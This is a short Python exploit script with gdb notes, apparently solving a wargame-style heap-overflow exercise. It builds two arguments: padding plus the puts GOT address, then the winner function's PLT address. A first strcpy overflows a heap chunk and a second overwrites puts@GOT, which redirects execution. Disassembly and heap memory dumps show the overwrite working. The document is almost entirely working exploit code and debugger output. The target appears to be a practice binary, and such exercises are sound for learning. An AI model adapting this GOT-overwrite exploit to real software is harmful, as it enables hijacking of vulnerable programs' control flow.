import struct

put_got=struct.pack("I",0x08049774)
winner_plt=struct.pack("I",0x08048494)
argv_1="A"*20+put_got #heap layout
print argv_1

argv_2=winner_plt
print argv_2
#winner_plt overwrite put_got 
#(gdb)set args "`python -c "print 'A'*20+'\x74\x97\x04\x08'"`" "`python -c "print '\x94\x84\x04\x08'"`"
#heap 
'''
first strcpy heap to overflow
secode strcpy to overwrite put_got with winner_plt

0x8048555 <main+156>:	call   0x804838c <strcpy@plt>
0x804855a <main+161>:	mov    DWORD PTR [esp],0x804864b
0x8048561 <main+168>:	call   0x80483cc <puts@plt>
0x8048566 <main+173>:	leave
0x8048567 <main+174>:	ret
0xbffff750:	0x08049774	0xbffff97d	0x08048580	0xbffff778
0xbffff760:	0xb7ec6365	0x0804a008	0x0804a028	0xb7fd7ff4
0xbffff770:	0x08048580	0x00000000
(gdb) x 0xbffff97d
0xbffff97d:	0x08048494
(gdb) x/50wx 0x804a000
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x41414141	0x41414141
0x804a020:	0x41414141	0x41414141	0x41414141	0x08049774
0x804a030:	0x00000000	0x00000011	0x00000000	0x00000000
0x804a040:	0x00000000	0x00020fc1	0x00000000	0x00000000
'''
